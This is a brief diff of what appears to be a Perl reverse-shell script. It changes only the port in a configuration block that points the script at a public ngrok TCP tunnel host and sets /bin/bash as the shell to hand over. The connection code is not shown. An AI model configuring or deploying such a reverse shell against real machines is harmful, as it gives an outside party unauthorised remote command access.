@@ -6,7 +6,7 @@ use POSIX;
 
 # ================= CONFIGURATION =================
 my $SERVER = "0.tcp.ap.ngrok.io";
-my $PORT   = 15322;
+my $PORT   = 13846;
 my $SHELL  = "/bin/bash";
 # =================================================
 
